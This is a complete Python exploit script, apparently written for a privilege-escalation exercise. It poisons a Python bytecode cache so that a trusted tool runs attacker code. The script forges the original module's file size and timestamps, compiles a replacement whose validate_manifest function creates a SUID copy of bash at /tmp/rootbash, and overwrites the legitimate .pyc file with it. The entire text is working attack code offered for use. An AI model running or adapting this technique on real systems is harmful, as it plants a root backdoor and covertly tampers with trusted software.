import os
import py_compile
import shutil
import sys

# 1. Define Targets
# The legitimate source file we are hijacking
ORIGINAL_SRC = "/opt/extensiontool/extension_utils.py"
# Where we will write our malicious source momentarily
MALICIOUS_SRC = "/tmp/extension_utils.py"
# The target compiled file we want to overwrite (Check python version! likely 3.12)
TARGET_PYC = "/opt/extensiontool/__pycache__/extension_utils.cpython-312.pyc"

# 2. Get Original Stats
# We need the exact size and timestamp of the original to trick Python
stat = os.stat(ORIGINAL_SRC)
target_size = stat.st_size

# 3. Craft Payload
# This payload copies /bin/bash to /tmp/rootbash and makes it SUID
payload = 'import os\n'
payload += 'def validate_manifest(path): os.system("cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash"); return {}\n'
payload += 'def clean_temp_files(arg): pass\n'

# 4. Pad with Comments
# We add '#' characters until our file is the EXACT same size as the original
padding_needed = target_size - len(payload)
payload += "#" * padding_needed

# Write the malicious source to tmp
with open(MALICIOUS_SRC, "w") as f:
    f.write(payload)

# 5. Timestomp
# Set the timestamp of our malicious file to match the original source
os.utime(MALICIOUS_SRC, (stat.st_atime, stat.st_mtime))

# 6. Compile
# Compile our malicious source into a bytecode file
py_compile.compile(MALICIOUS_SRC, cfile="/tmp/malicious.pyc")

# 7. Inject
# Overwrite the legitimate .pyc file with our malicious one
if os.path.exists(TARGET_PYC):
    os.remove(TARGET_PYC)
shutil.copy("/tmp/malicious.pyc", TARGET_PYC)

print("[+] Poisoned .pyc injected successfully")
